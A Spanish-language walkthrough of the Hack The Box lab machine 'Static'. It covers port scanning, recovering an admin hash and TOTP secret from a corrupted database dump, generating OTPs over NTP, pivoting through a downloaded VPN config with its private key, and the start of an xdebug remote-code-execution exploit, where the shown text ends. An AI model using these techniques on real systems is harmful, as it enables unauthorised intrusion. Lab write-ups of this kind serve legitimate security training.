---
layout: post
title: Static
date: 2023-03-16
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, eCPPTv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Static-htb/Static.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.246 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 17:55 GMT
Nmap scan report for 10.10.10.246
Host is up (0.14s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,2222,8080 10.10.10.246 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 17:57 GMT
Nmap scan report for 10.10.10.246
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16bba0a120b7824dd29f3552f42e6c90 (RSA)
|   256 caad638f30ee66b1379dc5eb4d44d92b (ECDSA)
|_  256 2d43bc4eb333c9824edeb65e10caa7c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9a45ce3a90554b11cae1bb761ac76d6 (RSA)
|   256 c9585393b3909ea008aa48be5ec40a94 (ECDSA)
|_  256 c7072b07434fabc8da577feab55021bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.50 seconds
```

## Puerto 8080 (HTTP)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.246:8080
http://10.10.10.246:8080 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.10.246]
```

En el ```robots.txt``` se leakean dos rutas

```null
curl -s -X GET http://10.10.10.246:8080/robots.txt
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

En ```/vpn/``` hay un panel de autenticación

<img src="/writeups/assets/img/Static-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.246:8080/vpn/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.246:8080/vpn/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/16 20:58:09 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 358]
/header.php           (Status: 200) [Size: 0]
/src                  (Status: 301) [Size: 312] [--> http://172.20.0.10/vpn/src/]
/database.php         (Status: 200) [Size: 0]
/actions.php          (Status: 302) [Size: 0] [--> index.php]
/panel.php            (Status: 302) [Size: 0] [--> index.php]
/.php                 (Status: 403) [Size: 276]
```

En ```/src``` hay varios scripts en PHP

```null
curl -s -X GET http://10.10.10.246:8080/vpn/src/ | html2text
****** Index of /vpn/src ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       Base32.php       2017-02-06 17:46 1.7K  
[[   ]]       Hotp.php         2017-02-06 17:46 2.0K  
[[   ]]       Totp.php         2017-02-06 17:46 1.0K  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at 172.20.0.10 Port 80
```

Al intentar cargar el ```Totp.php```, me devuelve un código de estado  ```408``` y en el error se leakea un dominio

```null
GET /vpn/src/Totp.php HTTP/1.1
Host: 10.10.10.246:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.246:8080/vpn/src/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=cheh9rj5mms0979ie2htiigp3i
Connection: close
```

```null
HTTP/1.1 408 Request Timeout
Date: Fri, 17 Mar 2023 09:32:01 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>408 Request Timeout</title>
</head><body>
<h1>Request Timeout</h1>
<p>Server timeout waiting for the HTTP request from the client.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at www.static.htb Port 80</address>
</body></html>
```

Lo agrego al ```/etc/hosts```. Pero a pesar de ello, se está tratando de conectar por el puerto 80, que está cerrado. ```nmap``` lo detecta como filtered, así que es probable que esté abierto internamente

```null
nmap -p80 10.10.10.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 09:36 GMT
Nmap scan report for www.static.htb (10.10.10.246)
Host is up (0.039s latency).

PORT   STATE    SERVICE
80/tcp filtered http

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

Las credenciales para el panel de inicio de sesión ```admin:admin``` son válidas, pero requiere de un OTP

<img src="/writeups/assets/img/Static-htb/2.png" alt="">

En ```/.ftp_uploads``` hay varios archivos

```null
curl -s -X GET http://10.10.10.246:8080/.ftp_uploads/ | html2text
****** Index of /.ftp_uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       db.sql.gz        2020-06-18 12:30  262  
[[TXT]]       warning.txt      2020-06-19 13:00   78  
===========================================================================
     Apache/2.4.38 (Debian) Server at 10.10.10.246 Port 8080
```

Me descargo el comprimido y extraigo su contenido

```null
7z x db.sql.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 262 bytes (1 KiB)

Extracting archive: db.sql.gz
--
Path = db.sql.gz
Type = gzip
Headers Size = 17

ERROR: CRC Failed : db.sql

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

```null
cat db.sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA; 
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN
```

Está corrupto, por lo que descargo una herramienta que trata de recomponerlo, disponible en [Github](https://raw.githubusercontent.com/yonjar/fixgz/master/fixgz.cpp)

```null
gcc fixgz.cpp -o fixgz --static
```

```null
./fixgz db.sql.gz new.gz
```

```null
gunzip new.gz
```

Ahora ya es legible

```null
cat db.sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

El hash no tiene sentido de crackearlo porque ya sé que es ```admin```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)     
1g 0:00:00:00 DONE (2023-03-17 09:48) 50.00g/s 991200p/s 991200c/s 991200C/s akusayangkamu..ISRAEL
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

Como los OTPs toman la hora actual como semilla, es importante estar sincronizado en caso de querer obtenerla. El puerto del NTP está abierto

```null
nmap -sU -p123 10.10.10.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 09:49 GMT
Nmap scan report for www.static.htb (10.10.10.246)
Host is up (0.096s latency).

PORT    STATE SERVICE
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Utilizo las librerías ```pyotp``` y ```ntplib``` de python

```null
python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pyotp
>>> import ntplib
>>> from time import ctime
>>> client = ntplib.NTPClient()
>>> response = client.request("10.10.10.246")
>>> otp = pyotp.TOTP("orxxi4c7orxwwzlo")
>>> print("TOKEN: %s" % otp.at(response.tx_time))
TOKEN: 891517
```

Es válido, y gano acceso a otra interfaz

<img src="/writeups/assets/img/Static-htb/3.png" alt="">

El formulario genera un archivo para conectarse a una VPN

```null
POST /vpn/panel.php HTTP/1.1
Host: 10.10.10.246:8080
Content-Length: 7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.246:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.246:8080/vpn/panel.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=cheh9rj5mms0979ie2htiigp3i
Connection: close

cn=test
```

```null
HTTP/1.1 200 OK
Date: Fri, 17 Mar 2023 10:08:45 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="test.ovpn"
Content-Type: application/octet-stream
Connection: close
Content-Length: 8304

client
dev tun9
proto udp
remote vpn.static.htb 1194
resolv-retry infinite
nobind
user nobody
group nogroup
persist-key
persist-tun

remote-cert-tls server

cipher AES-256-CBC
#auth SHA256
key-direction 1
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL
BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw
MjI3MTAxNjAxWjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3cwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDCA/rLO4l5goACROYshzlVowO7hAl+EDgAUof3VSph
1UF2OCCr2J2xpOkkWHKFPCTl+fCtLcxKZdb5zQBKhIvxJ3Tzqe18whu23aI8Imol
AQcqZcaSMTRXAp8HKsrxpXl8TtbZ2y4nAVR0YXAWOadSMQtmztiOgzDAP+FbqZQf
CnKBW+yxNxjlrD/VpVf/C9GnXDn+QH2ezoOYCid6+ANuiSTqks3FzEnUrwuVMgxp
MW94Sw/2d8WbUfD5DxKvyHObjDwwZn54ZNz8WEXzTfqTtFD1ghNsvVJgvsDmyMYh
7nDfRSxNc3cEY8FOVvvaA3BvPP06xVEz0GrJkfUNjyvFAgMBAAGjgY4wgYswHQYD
VR0OBBYEFKHag2AygX8bgBngIC3WYMil7YJUME8GA1UdIwRIMEaAFKHag2AygX8b
gBngIC3WYMil7YJUoRikFjAUMRIwEAYDVQQDDAlzdGF0aWMtZ3eCFEfpmK1xyTkV
eLW4PNbEEu0X42CuMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgEGMA0GCSqGSIb3
DQEBCwUAA4IBAQAG/yziZ6ae3f//fsOmU0GBLwKzWGzQxdykHAwN6452Mt3FHT7A
0+aT+C9DWmx4r71PD8RIDI9eDdOu9RZ8VoutZuZrhca5SpLoGfIFnmveNzy0mcf7
a/AQCH/XSOr8+FkF6UGXUK80lylqe3R/1YXct3htZZEPuSBDdi6zPMrq4UaGCPkY
bOFXVZZA7KHkzt5F8ajGs7xbTNTarOsPjdhN75dMfnG1w8upw1DLb1LE8QTP00fQ
i0wzJtUvYetL96vt/mbo8AuYZmWWmOzm1mJLNn4UbhG65/mHfBWHduRy1YZeeiuI
qYSaD5L082aZQj/S+qfTgkRiT2nduN1pZURn
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            59:fc:be:66:f5:2d:97:e7:3f:ad:83:5c:95:d7:51:0f
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=static-gw
        Validity
            Not Before: Mar 17 10:08:45 2023 GMT
            Not After : Feb 21 10:08:45 2123 GMT
        Subject: CN=test
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:9d:ed:dd:8e:22:ea:ed:bd:7b:80:dd:65:da:e2:
                    1a:a0:4c:63:30:b4:fb:93:2e:6d:34:89:47:b8:51:
                    03:31:43:7a:0f:60:b8:de:36:e3:dc:62:22:1c:6c:
                    a4:c3:d1:20:2c:a5:12:8b:63:69:9c:13:69:ef:a2:
                    e5:71:70:64:44:4d:c4:81:ac:af:c8:cc:03:3d:39:
                    29:18:70:e1:20:15:8c:e8:d6:7c:d3:e8:e0:78:8c:
                    ef:20:07:bf:62:d4:3a:db:1e:d0:ae:3e:6d:59:d8:
                    9d:62:3d:5b:3c:bf:8b:8b:fb:15:a9:a3:b5:8d:45:
                    c4:b2:6d:03:d6:c0:38:74:e7:71:cd:61:cf:77:fe:
                    36:c3:2d:08:fd:f1:ea:66:e1:c2:d3:05:ba:35:86:
                    1c:61:a8:27:77:94:6a:f4:bf:2d:ce:d7:00:3c:9f:
                    e9:2b:92:81:eb:95:f1:28:e1:b5:67:42:36:6f:e8:
                    24:5c:15:08:bf:f0:0c:ba:6c:88:42:7e:3c:ca:1f:
                    8f:5f:7b:53:1b:14:b2:27:27:6f:20:5b:6f:07:29:
                    63:b6:3e:3f:87:b7:97:58:57:bc:02:39:13:fd:54:
                    cc:d6:da:44:37:58:8c:9b:dc:b8:ea:8d:56:48:0c:
                    44:6f:0c:e0:63:b0:25:da:69:95:da:0e:e7:13:26:
                    13:79
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Subject Key Identifier: 
                2E:B8:1F:64:16:0A:CE:17:F1:98:2B:6B:00:0C:78:8B:63:67:BF:AC
            X509v3 Authority Key Identifier: 
                keyid:A1:DA:83:60:32:81:7F:1B:80:19:E0:20:2D:D6:60:C8:A5:ED:82:54
                DirName:/CN=static-gw
                serial:47:E9:98:AD:71:C9:39:15:78:B5:B8:3C:D6:C4:12:ED:17:E3:60:AE

            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Key Usage: 
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
         03:0b:71:35:1e:e3:d7:bb:8d:ac:ae:32:c8:f9:be:2d:03:cd:
         da:78:a6:e7:ab:e0:4d:12:83:fe:49:3b:b7:3f:a0:b3:26:68:
         4d:e5:3a:f1:0f:bc:89:91:82:13:a9:aa:2a:1b:9f:80:12:97:
         ef:71:c0:7e:d6:fc:16:bd:92:d3:81:bc:2a:6b:4a:2b:4a:18:
         b1:b4:d7:c6:b3:74:40:c2:92:a3:89:45:3e:ea:5e:80:cb:87:
         98:76:9f:93:90:01:94:e1:b4:83:b2:1c:c7:d2:7d:21:34:f5:
         f7:c2:dc:ea:35:d0:4a:a9:e0:ea:62:2d:da:c1:05:ea:24:70:
         47:93:df:86:1a:c3:70:4b:fe:b7:f0:66:97:f6:1c:76:27:2e:
         80:d9:69:c6:c6:c1:a4:67:0f:a6:a8:42:39:cb:69:99:90:83:
         3d:89:77:31:5c:35:a9:ed:cc:2c:8c:c7:65:6b:b9:a2:17:b0:
         bf:46:94:4f:13:f1:5d:d1:77:6d:72:c2:4d:11:f8:8b:9e:85:
         42:2b:10:ab:11:94:de:a6:a0:b3:ca:61:cb:3f:16:1b:36:bc:
         5b:21:78:57:1a:d1:71:54:d1:b6:ae:23:04:ab:d1:c2:8b:4a:
         86:39:4a:24:22:8b:ef:29:b5:8b:21:76:86:e6:6a:29:25:65:
         60:eb:9f:eb
-----BEGIN CERTIFICATE-----
MIIDUDCCAjigAwIBAgIQWfy+ZvUtl+c/rYNclddRDzANBgkqhkiG9w0BAQsFADAU
MRIwEAYDVQQDDAlzdGF0aWMtZ3cwIBcNMjMwMzE3MTAwODQ1WhgPMjEyMzAyMjEx
MDA4NDVaMA8xDTALBgNVBAMMBHRlc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQCd7d2OIurtvXuA3WXa4hqgTGMwtPuTLm00iUe4UQMxQ3oPYLjeNuPc
YiIcbKTD0SAspRKLY2mcE2nvouVxcGRETcSBrK/IzAM9OSkYcOEgFYzo1nzT6OB4
jO8gB79i1DrbHtCuPm1Z2J1iPVs8v4uL+xWpo7WNRcSybQPWwDh053HNYc93/jbD
LQj98epm4cLTBbo1hhxhqCd3lGr0vy3O1wA8n+krkoHrlfEo4bVnQjZv6CRcFQi/
8Ay6bIhCfjzKH49fe1MbFLInJ28gW28HKWO2Pj+Ht5dYV7wCORP9VMzW2kQ3WIyb
3LjqjVZIDERvDOBjsCXaaZXaDucTJhN5AgMBAAGjgaAwgZ0wCQYDVR0TBAIwADAd
BgNVHQ4EFgQULrgfZBYKzhfxmCtrAAx4i2Nnv6wwTwYDVR0jBEgwRoAUodqDYDKB
fxuAGeAgLdZgyKXtglShGKQWMBQxEjAQBgNVBAMMCXN0YXRpYy1nd4IUR+mYrXHJ
ORV4tbg81sQS7RfjYK4wEwYDVR0lBAwwCgYIKwYBBQUHAwIwCwYDVR0PBAQDAgeA
MA0GCSqGSIb3DQEBCwUAA4IBAQADC3E1HuPXu42srjLI+b4tA83aeKbnq+BNEoP+
STu3P6CzJmhN5TrxD7yJkYITqaoqG5+AEpfvccB+1vwWvZLTgbwqa0orShixtNfG
s3RAwpKjiUU+6l6Ay4eYdp+TkAGU4bSDshzH0n0hNPX3wtzqNdBKqeDqYi3awQXq
JHBHk9+GGsNwS/638GaX9hx2Jy6A2WnGxsGkZw+mqEI5y2mZkIM9iXcxXDWp7cws
jMdla7miF7C/RpRPE/Fd0XdtcsJNEfiLnoVCKxCrEZTepqCzymHLPxYbNrxbIXhX
GtFxVNG2riMEq9HCi0qGOUokIovvKbWLIXaG5mopJWVg65/r
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCd7d2OIurtvXuA
3WXa4hqgTGMwtPuTLm00iUe4UQMxQ3oPYLjeNuPcYiIcbKTD0SAspRKLY2mcE2nv
ouVxcGRETcSBrK/IzAM9OSkYcOEgFYzo1nzT6OB4jO8gB79i1DrbHtCuPm1Z2J1i
PVs8v4uL+xWpo7WNRcSybQPWwDh053HNYc93/jbDLQj98epm4cLTBbo1hhxhqCd3
lGr0vy3O1wA8n+krkoHrlfEo4bVnQjZv6CRcFQi/8Ay6bIhCfjzKH49fe1MbFLIn
J28gW28HKWO2Pj+Ht5dYV7wCORP9VMzW2kQ3WIyb3LjqjVZIDERvDOBjsCXaaZXa
DucTJhN5AgMBAAECggEAbgcZk3w6RpX7pIUbAEsEl+eAN5/vodP3m2GFSSGP4tOL
B4mwYojFaXYpI7qBdDePfesnp1sEaguQg7buuYC/KmMv49RGx9Ny8kWPnwqNncfF
2zYL06tsMDCoLJ2ZNiZ8NssaQjsV/kGPLLFojkM42rZ8miqHQzx3VIPk58oVy0OX
55ep4el87P/M2gnaSj1JKSGW5u1vhX3+3+G9AqyX6m6AH9zWTctrahNW41tXP9x7
GoGwBOQFJ3Ki/wMgd7pJZg3xEPnpWLYPW2/uTum8wgLzPBzEtzgMC3/SIBE8XxhB
Fuv62nwARS3jeYJj7ZyNdcgnq69QtAhbfumZryzzAQKBgQDNKjqhMbXQ0Qv2F38K
PuJ7QrHQcHgyap2E+YR0N7fHA5mI7M0yHNkvfi14ASy9KQl/qJYF6lHcv5MpHPd5
4AaLPv1ofmiSPZIrjKYF92n59rqhKGSYBADyn7yGyfccrMtfUakS9LQJZM88wGOB
isC78LD/fyi6dCISTrcBHDKaGQKBgQDFD28Brjr+SmA33dl+oxGCs6bjQeMuoESi
g/rMgA1B34R6ekRDPYUIL2pRbsnUQfIp/32dBoKTbsRjRx+UACpNa9nstZTijB0r
8Gk2nZ1LtcF+BDcGaMqATVDQSYCKd+Mm738Phv7mnd0Cv2TsjSnrjWSRA4dpaDxb
5yGkzF0wYQKBgQCQmHub0fovQrYoaiTqJqneb4H8wtejyMpdxrGYaxCGHb5e524z
LGvRch8/naxXYQ3FwB6D6sJpT0e7SSQN7FsQVoOo2rZ+oxBayxTTza0OM9sS6/IB
xYiZdwUbBkq4Ffx7oIUFzBr7J+Z7DajTyuPNUXSdjZQ53NGKj5mhGat8OQKBgCZl
AGriaIodMawQ5IyA9ytxF2YV806lWVoUvuvTU0Hva991LRGwzdevbVaacGaTxrwa
FH5gw1Y4cbkqJWPvuE5HYjl1k6GkTRa/i7Bhe0FCE4YbCiGMj0/6QHGksI/KFg8D
AM2krst+HI6pfd99DZrgfKSofFy0O3ZojSyPyORhAoGAYWKAxSrH3TMvPWsg+8zg
kN1BNEeJVWcU/VHSWEPQjDb1NC8d+bHu+WQNukHuk1pWyEG++WGlmUxZeui5NZuc
KcX30XSxsTx4JEs3XvE67Zpf4q6FbUs4T9UkV5OETFYy19GW42Gi4RTTxXz0vpMx
XveX6vDV+XH+mnzQLk3725o=
-----END PRIVATE KEY-----
</key>
key-direction 1
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
09a194dc6aee4ae65459c682cc0b25e9
43e54d75dd1d83653ef04a67c65177da
98df768c86585611755082c6b06da8d9
21a4e3afd8d4537c3be9cf3c91a31ddd
157c9ff3f99c5f098ca8be7fe4e01435
86ac1e6b62d126d9f31bf603cd822e26
4a0dfdcb5aa5e66d97cd7b338e7dc07a
62a7691b4fc80830c169f27486f9f22e
4b71185dda7c5adac7ed55b80190dd35
3ec31228f556903d23dbf12d3928578d
c7fe5488d77ab72a0f50ae8d975af87e
ec0dbce0f9f7bf2c01aff9c9cf4fcc99
aaca4a1e81a0a240565c356cd33c6163
f7d986e0395ea90a439b176542a42009
2aafeb626aadb6abc35fa023426c9334
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
```

Agrego el subdominio ```vpn.static.htb``` al ```/etc/hosts```. Me conecto con ```openvpn```

```null
openvpn test.ovpn
```

Esto me ha asignado una nueva interfaz

```null
ip a
...
5: tun9: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 172.30.0.9/16 scope global tun9
       valid_lft forever preferred_lft forever
    inet6 fe80::29b9:a790:5149:7b4/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
```

Únicamente está mi equipo y otro host activo

```null
nmap -sn 172.30.0.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 10:14 GMT
Nmap scan report for 172.30.0.1
Host is up (0.055s latency).
Nmap scan report for 172.30.0.9
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 6.54 seconds
```

Le escaneo todos los puertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 172.30.0.1
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 10:16 GMT
Nmap scan report for 172.30.0.1
Host is up (0.060s latency).
Not shown: 63798 closed tcp ports (reset), 1735 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
```

```null
nmap -p- --open --min-rate 5000 -n -Pn 172.30.0.1
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 10:16 GMT
Nmap scan report for 172.30.0.1
Host is up (0.060s latency).
Not shown: 63798 closed tcp ports (reset), 1735 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 14.77 seconds
❯ nmap -sCV -p22,2222 10.10.10.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 10:17 GMT
Nmap scan report for vpn.static.htb (10.10.10.246)
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16bba0a120b7824dd29f3552f42e6c90 (RSA)
|   256 caad638f30ee66b1379dc5eb4d44d92b (ECDSA)
|_  256 2d43bc4eb333c9824edeb65e10caa7c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9a45ce3a90554b11cae1bb761ac76d6 (RSA)
|_  256 c7072b07434fabc8da577feab55021bd (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.14 seconds
```

Para poder llegar tener alcance con el resto de los segmentos, puedo tratar crear rutas estáticas

```null
ip route add 172.20.0.0/24 dev tun9
```

Ahora si mando una traza ICMP, la recibo

```null
ping -c 1 172.20.0.11
PING 172.20.0.11 (172.20.0.11) 56(84) bytes of data.
64 bytes from 172.20.0.11: icmp_seq=1 ttl=63 time=45.3 ms

--- 172.20.0.11 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.346/45.346/45.346/0.000 ms
```

Le escaneo los puertos

```null
nmap --min-rate 5000 -n -Pn -sS 172.20.0.10
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 10:27 GMT
Nmap scan report for 172.20.0.10
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

Tiene expuesto un ```phpinfo()```

<img src="/writeups/assets/img/Static-htb/4.png" alt="">

Listo los módulos existentes

```null
curl -s -X GET http://172.20.0.10/info.php | grep module | html2text | awk '{print $2}'
apache2handler
calendar
Core
ctype
curl
date
exif
fileinfo
filter
ftp
gettext
hash
iconv
json
libxml
mysqli
mysqlnd
openssl
pcre
PDO
pdo_mysql
Phar
posix
readline
Reflection
session
shmop
sockets
sodium
SPL
standard
sysvmsg
sysvsem
sysvshm
tokenizer
xdebug
Zend
zlib
```

Está el ```xdebug``` habilitado. Inspecciono el exploit de ```MetasPloit```

```null
searchsploit xdebug
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
xdebug < 2.5.5 - OS Command Execution (Metasploit)                                                                                                                             | php/remote/44568.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

El payload lo envía aquí:

```null
send_request_cgi({
    'uri' => datastore['PATH'],
    'method' => 'GET',
    'headers' => {
      'X-Forwarded-For' => "#{lhost}",
      'Cookie' => 'XDEBUG_SESSION='+rand_text_alphanumeric(10)
```

Utilizo este repositorio de [Github](https://github.com/nqxcode/xdebug-exploit)

```null
curl -s -X GET http://172.20.0.10/info.php -H "Cookie: XDEBUG_SESSION=1234567890"
```

```null
rlwrap python2 exploit_shell.py
495<?xml version="1.0" encoding="iso-8859-1"?>
